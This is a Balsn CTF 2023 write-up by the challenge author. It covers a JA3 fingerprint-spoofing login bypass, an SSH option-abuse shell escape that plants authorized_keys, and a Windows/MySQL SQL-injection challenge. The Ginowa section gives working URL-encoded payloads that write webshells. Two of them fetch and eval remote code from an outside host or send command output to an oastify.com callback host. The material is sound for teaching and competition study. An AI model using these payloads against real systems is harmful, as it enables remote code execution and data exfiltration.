# Balsn CTF 2023

## 0FA

- Difficulty: ☆
- Type: Web
- Solved: 83 / 333
- Tag: warmup, not-so-web, web-is-misc

### Description

I really don't like 2FA, so I created a 0FA login system!

https://0fa.balsnctf.com:8787/index.php

Author: kaibro

### Source Code

- [0FA](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2023/0FA/)

### Solution

From the source code, we can see there is a fingerprint checking function:

```php
function fingerprint_check() {
    if($_SERVER['HTTP_SSL_JA3'] !== FINGERPRINT) 
        die("Login Failed!"); 
}
```

It will try to compare the `$_SERVER['HTTP_SSL_JA3']` value with the pre-defined fingerprint. if the comparison failed, the script will immediately exit.

What is JA3?

> JA3 is a method for creating SSL/TLS client fingerprints that should be easy to produce on any platform and can be easily shared for threat intelligence.

(more detail: [link](https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/))

And the required JA3 Fingerprint for this challenge is `771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0`

We can use some libraries to spoof a JA3 fingerprint to pass this login check, for example, using [CycleTLS](https://github.com/Danny-Dasilva/CycleTLS):

```go
package main
import (
    "log"
    "github.com/Danny-Dasilva/CycleTLS/cycletls"
)

func main() {
    client := cycletls.Init()
    response, err := client.Do("https://0fa.balsnctf.com:8787/flag.php", cycletls.Options {
        Ja3: "771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
        Body: "username=admin",
        Headers: map[string]string {
            "Content-Type": "application/x-www-form-urlencoded",
        },
      }, "POST");
    if err != nil {
        log.Print("Request Failed: " + err.Error())
    }
    log.Println(response)
}
```

---


## kShell

- Difficulty: ★★
- Type: Misc
- Solved: 11 / 333

### Description

Simple shell escaping again!

`nc kshell.balsnctf.com 7122`

Try to run `/readflag` to get the flag!

(Please use your own access token. And each team can only have one session.)

Author: kaibro

### Source Code

- [kShell](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2023/kShell/)

### Solution

The idea of this challenge comes from a realworld case. Hope you guys like it!

Speical thanks to [Orange's oShell challenge](https://github.com/orangetw/My-CTF-Web-Challenges#oShell)!


#### Intended Solution

step 1. write a file with "your public key" filename by `-E`:

```
ssh -E "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOi8DD3ZUFWyCT5UEPzho7Qjb5CcxlOt59weYiuhIohG " 0
```

step 2. using `-F` to trigger error and then write the error message to `.ssh/authorized_keys`:

```
ssh -F "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOi8DD3ZUFWyCT5UEPzho7Qjb5CcxlOt59weYiuhIohG " 0 -E ".ssh/authorized_keys"
```

step 3. connect to your server and use `-R` to forward 22 port of challenge server:

```
ssh -R 0.0.0.0:12345:localhost:22 kaibro@yourserver
```

step 4. now, you can ssh login with your own private key:

```
on your server: ssh kShell@localhost -p 12345 -i ./private_key
```


#### Unintended Solution

**Solution 1**:

(The first part of this solution is very similar to my intended solution)

- https://gist.github.com/lebr0nli/14b59e8e66c50aa0ff172640d1bb1727
    - Create a log file with the filename: `Match exec "sh 0<&2 1>&2" #`.
    - Use this log file as a configuration file. It will trigger an error that includes our match payload at the beginning of the line. Capture these errors in the win file.
    - Load the win file as the configuration file. Profit!

(by lebr0nli)

<br>

**Solution 2**:

```
ssh -F /dev/stdin localhost

ProxyCommand ;/readflag >&2

send Ctrl+D after input
```

(by Crazyman)

<br>

... and more!

---

## Ginowa

- Difficulty: ★★
- Type: Web
- Solved: 13 / 333

### Description

Ginowa is the best dating website designed for Chihuahua to meet new friends!

Try to run `C:/readflag_[some_random_hex].exe` on the backend to get the flag!

http://ginowa-1.balsnctf.com

http://ginowa-2.balsnctf.com

Author: kaibro

### Source Code

- [Ginowa](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2023/ginowa/)

### Solution

The idea of this challenge comes from a realworld case too.

#### Intended Solution 

step 1. write a webshell to webroot:

```
/index.php?id=-2%27union%2520select%25201,2,3,%27%3C%3fphp%2520chdir(%22C:/%22);shell_exec(%22.\\readflag_9a82cf0e37dd1b.exe%3Exampp\\meow.txt%22)%3b%3f%3E%27%2520into%2520outfile%2520%27c%3a/xampp/htdocs/kaibro123.php%27--%2520
```

step 2. use mysql trick (`load_file('//HOST@PORT/SOME_PATH')`) to send a http request to trigger webshell:

```
/index.php?id=-2%27union%2520select%25201,2,3,load_file(%27//localhost@8080/kaibro123.php%27)--%2520
```

Note: 
this trick is based on windows mysql and webclient service. more detail: [link](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)

Note2: 
it seems like the windows defender was automatically activated during the ctf, so we might need to race it (sorry for the painful waf challenge...lol)

#### Unintended Solution

I apologize for not including some restrictions, so there are many unintended solution... 
And I didn't realize that the defender was turned on, so writing webshell would become very painful...(But it's still solvable)
Even so, I still really like some of the unintended solutions. These solutions have truly impressed me. 

Windows is really f**king hard 🫠

<br>

**Solution 1** - write a `.htaccess` file:

```
/index.php?id=<@urlencode_not_plus>0'%20or%201=1%20into%20outfile%20'C:/xampp/htdocs/.htaccess'%20FIELDS%20enclosed%20by%200x23%20lines%20terminated%20by%200x3c3f706870206576616c2866696c655f6765745f636f6e74656e74732827687474703a2f2f6f2e63616c312e636e2f702e7478742729293b3f3e0a7068705f76616c7565206175746f5f70726570656e645f66696c65202e68746163636573730d0a--%20x<@/urlencode_not_plus> HTTP/1.1
```

(by Crazyman)

<br>

**Solution 2** - read `readflag_[some random hex].exe` by windows shortname trick:

```
/index.php?id=33333%27%2520UNION%2520SELECT%2520%27ok%27%252c%2520HEX(LOAD_FILE(%27C%253a%255c%255creadfl~1.exe%27))%252c%2520%27%27%252c%2520%27%27%2520%2523%2520
```

(by trixter)

<br>

**Solution 3** - execution path hijacking by writing `sc.bat`:

```
/index.php?id=0%2527%2520UNION%2520SELECT%25200x0a6364205c202626202e5c72656164666c61675f39613832636630653337646431622e6578650a%252C%2520%2527%2527%252C%2520%2527%2527%252C%2527%2527%2520INTO%2520DUMPFILE%2520%2527C%253A%2Fxampp%2Fhtdocs%2Fsc.bat%2527%2520--%2520
```

(by splitline)

<br>

**Solution 4** - write `config.php` to PEAR directory:

```
/index.php?id='%2520union%2520select%2520'ok'%252c%2540%2540tmpdir%252c'%253c%253fphp%2520define(%2522DBHOST%2522%252c%2522localhost%2522)%253bdefine(%2522DBNAME%2522%252c%2522ginowa%2522)%253bdefine(%2522DBUSER%2522%252c%2522root%2522)%253bdefine(%2522DBPASS%2522%252c%2522%2522)%253bif(%2524_GET%255b%2522ierae9ru09fwqopk%2522%255d)file_get_contents(%2522http%253a%252f%252fehzva3sgua59eq7koimj4ds21t7kvdj2.oastify.com%252f%253f%2522.urlencode(shell_exec(%2524_GET%255b%2522ierae9ru09fwqopk%2522%255d)))%253b%253f%253e'%252c'foo'%2520into%2520outfile%2520'C%253a%252fxampp%252fphp%252fPEAR%252fconfig.php
```

p.s. This trick is really interesting! It's a technique that I wasn't familiar with before.

<br>

... and maybe more?